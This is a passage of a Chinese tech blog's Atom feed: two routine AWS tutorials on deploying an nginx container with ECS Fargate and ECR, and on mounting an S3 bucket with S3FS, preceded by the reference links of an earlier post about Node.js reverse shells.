参考链接"></a>0x04 参考链接</h2><ul><li><a href="https://klionsec.github.io/2016/09/27/revese-shell/" target="_blank" rel="noopener">你和目标只差一个shell的距离</a></li><li><a href="https://dev.classmethod.jp/cloud/aws/check-os-layer-because-change-amazon-linux-2/" target="_blank" rel="noopener">AWS LambdaのOSがAmazon Linux 2に変わっていたから中身を覗いてみた</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;原本在测AWS Lambda，后来变成研究Node.js反弹shell了，hhh。&lt;/p&gt;
&lt;h2 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ECS Fargate 初体验</title>
    <link href="https://tonghuaroot.com/2019/11/19/AWS-ECS-Fargate/"/>
    <id>https://tonghuaroot.com/2019/11/19/AWS-ECS-Fargate/</id>
    <published>2019-11-19T04:17:55.000Z</published>
    <updated>2019-11-19T12:18:41.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>对标K8S，ECS就是AWS上做docker集群管理用的。ECS Fargate就是托管的，我不需要登上实例管理了。这里搞个简单的demo测试一下。</p><h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h2><p>用的cn-northwest-1的ECS。</p><ol><li>先创建一个集群<br><img src="FBBDAB5995CD4E82B94CF0800ABBE4A2" alt="image"></li></ol><p><img src="44A011E1C08B456596D14D04FF699C4F" alt="image"></p><p><img src="2D94472F16AE4289A6E68D70E32F62F6" alt="image"></p><p>稍等片刻，集群就创建完了</p><p><img src="4FF4DF34DB7745AFBB57A9A6842559CC" alt="image"></p><ol start="2"><li>然后再搞个ECR仓库用来装docker镜像</li></ol><p><img src="7108A100DB114454813C6E01527EB30F" alt="image"></p><p><img src="C5C663FA6ED646BE94CD71E4A663EE9E" alt="image"></p><ol start="3"><li>仓库创建完了之后，回到EC2实例上，把dockerhub上的镜像拖回来搞到ECR上<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ec2-user]# docker pull nginx</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/nginx</span><br><span class="line">Digest: sha256:922c815aa4df050d4df476e92daed4231f466acc8ee90e0e774951b0fd7195a4</span><br><span class="line">Status: Image is up to date for nginx:latest</span><br><span class="line">[root@ip-10-0-0-64 ec2-user]#</span><br></pre></td></tr></table></figure></li></ol><p><img src="CBF341A5AF9143D09D59175B527E07EB" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ec2-user]# $(aws ecr get-login --no-include-email --region cn-northwest-1)</span><br><span class="line">WARNING! Using --password via the CLI is insecure. Use --password-stdin.</span><br><span class="line">WARNING! Your password will be stored unencrypted in /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/#credentials-store</span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br><span class="line">[root@ip-10-0-0-64 ec2-user]# docker tag nginx:latest 297692170000.dkr.ecr.cn-northwest-1.amazonaws.com.cn/tonghua-ecr-repo:latest</span><br><span class="line">[root@ip-10-0-0-64 ec2-user]# docker push 297692170000.dkr.ecr.cn-northwest-1.amazonaws.com.cn/tonghua-ecr-repo:latest</span><br><span class="line">The push refers to repository [297692170000.dkr.ecr.cn-northwest-1.amazonaws.com.cn/tonghua-ecr-repo]</span><br><span class="line">a89b8f05da3a: Pushed</span><br><span class="line">6eaad811af02: Pushed</span><br><span class="line">b67d19e65ef6: Pushed</span><br><span class="line">latest: digest: sha256:f56b43e9913cef097f246d65119df4eda1d61670f7f2ab720831a01f66f6ff9c size: 948</span><br><span class="line">[root@ip-10-0-0-64 ec2-user]#</span><br></pre></td></tr></table></figure><p><img src="E361F462C2C44FB6A0D0D209F84A0850" alt="image"></p><p>可以看到已经传成功了：</p><p><img src="50083D3C162C4C4887BA50D346D69A19" alt="image"></p><h2 id="0x02-创建服务"><a href="#0x02-创建服务" class="headerlink" title="0x02 创建服务"></a>0x02 创建服务</h2><p>前面准备工作就算做完了，这头我就继续拿着传上来的镜像部署服务了。</p><ol><li>创建任务定义<br><img src="4CA8FEC7E4694CC2ABB688E8C8C95858" alt="image"></li></ol><p><img src="9097E8E63E7D468992B7065DD5D20DFC" alt="image"></p><p><img src="B987529C49B6466BA7CEEA5CA96D7EC9" alt="image"></p><p>别的都用默认值，然后再增加下容器。</p><p><img src="4035863F7104405A924EAA61BEBC168E" alt="image"></p><p>可以看到，任务定义已经创建成功了，</p><p><img src="C81826E7AD0641A3964033BAB757DDFC" alt="image"></p><ol start="2"><li>然后进到一个集群里头创建一个服务试试：</li></ol><p><img src="68A003A152294183A3C7AE3444CD6C76" alt="image"></p><p><img src="E85C72E4B637485895E27426B2A155EF" alt="image"></p><p>emm，刚才创建的任务定义忘了映射端口了，重新创建一个把docker容器的80端口映射出来。</p><p>然后还需要创建一个ALB，部署在ECS前端。</p><p><img src="D7DD9C6E31E24064830987AC0CCBE4BE" alt="image"></p><p>继续下一步：</p><p><img src="5889746F488442B895AFB5F36A698674" alt="image"></p><p>然后等着启动就行了：<br><img src="E3A420F6B5FE41878A61CA8271951C49" alt="image"></p><p>可以看到，都成了。<br><img src="F102DC68F50D46F59AF5FF9B4693B465" alt="image"></p><h2 id="0x03-troubleshooting"><a href="#0x03-troubleshooting" class="headerlink" title="0x03 troubleshooting"></a>0x03 troubleshooting</h2><p>一般都是看【服务】的【事件】，【任务】的【log】，具体情况具体看吧。<br><img src="B2FAC9C250A74D9C89A3F92ECBBEC643" alt="image"></p><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>简单记录下，文档看的云里雾里，还是动手一把梭来的快一点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;对标K8S，ECS就是AWS上做docker集群管理用的。ECS Fargate就是托管的，我不需要
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>S3FS 简介及部署</title>
    <link href="https://tonghuaroot.com/2019/11/17/how-to-install-S3FS/"/>
    <id>https://tonghuaroot.com/2019/11/17/how-to-install-S3FS/</id>
    <published>2019-11-16T23:13:51.000Z</published>
    <updated>2019-11-17T07:16:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>S3FS可以把S3 Bucket可以向挂盘一样，挂在本地，适用于Linux和Mac OS，完事复制粘贴写文件啥的跟普通的文件夹几乎没啥差别，体验很棒。<br>当然，也有一些缺点，这个后面再说。（如果你遇不到它，那就是没缺点，大雾hhh）</p><h2 id="0x01-实验环境"><a href="#0x01-实验环境" class="headerlink" title="0x01 实验环境"></a>0x01 实验环境</h2><ul><li>Amazon Linux 2</li></ul><h2 id="0x02-操作步骤"><a href="#0x02-操作步骤" class="headerlink" title="0x02 操作步骤"></a>0x02 操作步骤</h2><ol><li><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo amazon-linux-extras install epel</span><br><span class="line">sudo yum install s3fs-fuse</span><br></pre></td></tr></table></figure></li><li><p>挂载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s3fs s3fs-tonghua s3fs_local #（前面是桶名，后面是本地需要挂载到的目录）</span><br></pre></td></tr></table></figure></li></ol><p>如果向上面那么玩，你使用中国区的S3的话，那一定是不成功的。通过debug信息我们可以看到其把请求打到global去了，“那前朝的剑，斩本朝的官”，那自然是行不通的，我们要把region改到中国来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s3fs s3fs-tonghua s3fs_local -o dbglevel=info -f -o curldbg # 开启debug日志</span><br></pre></td></tr></table></figure></p><p>可以通过如下方式修改endpoint，可以看到已经成功了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 /]# s3fs s3fs-tonghua s3fs_local -o url=https://s3.cn-north-1.amazonaws.com.cn                       [root@ip-10-0-0-64 /]# cd s3fs_local/</span><br><span class="line">[root@ip-10-0-0-64 s3fs_local]# ls</span><br><span class="line">test01_no_version.txt</span><br><span class="line">[root@ip-10-0-0-64 s3fs_local]#</span><br></pre></td></tr></table></figure></p><p>这种情况下，如果我机器重启了，那挂载的S3就没了。所以我们要给他换成/etc/fstab，保证其重启后也无需重新下载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ec2-user@ip-10-0-0-64 s3fs_local]$ cat /etc/fstab</span><br><span class="line">#</span><br><span class="line">UUID=8a9e0fcb-f415-4a3f-931d-919fadf8e22c     /           xfs    defaults,noatime  1   1</span><br><span class="line">s3fs#s3fs-tonghua /s3fs_local fuse _netdev,nonempty,allow_other,use_path_request_style,url=https://s3.cn-north-1.amazonaws.com.cn 0 0</span><br><span class="line">[ec2-user@ip-10-0-0-64 s3fs_local]$配置</span><br></pre></td></tr></table></figure></p><p>以上就完成了S3FS的配置。</p><h2 id="0x03-说说S3FS的利弊"><a href="#0x03-说说S3FS的利弊" class="headerlink" title="0x03 说说S3FS的利弊"></a>0x03 说说S3FS的利弊</h2><p>S3FS本质上是对象存储，其跟块存储还是有区别的，块存储我如果修改一个大文件的话，背后只修改对应的block，但是S3就不一样了，如果我传一个超大的文件，几个G或者T的，那他是会整个往S3传的，既费钱还有一致性的问题。<br>然后如果我读写频率太高的话，还容易被服务限制。<br>关于其缺点的话，官方文档说的也比较清楚了，我这头就不再赘述，有兴趣的同学可以去看看：<a href="https://github.com/s3fs-fuse/s3fs-fuse" target="_blank" rel="noopener">https://github.com/s3fs-fuse/s3fs-fuse</a></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>试了下S3FS，有的场景确实很方便，具体使用的话还是要结合自身业务场景，选择合适的数据传输、存储方式。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://github.com/s3fs-fuse/s3fs-fuse" target="_blank" rel="noopener">FUSE-based file system backed by Amazon S3</a></li><li><a href="http://manpages.ubuntu.com/manpages/xenial/man1/s3fs.1.html" target="_blank" rel="noopener">s3fs</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;S3FS可以把S3 Bucket可以向挂盘一样，挂在本地，适用于Linux和Mac OS，完事复制粘
      
    
    </summary>
    
    
  </entry>
  
</feed>
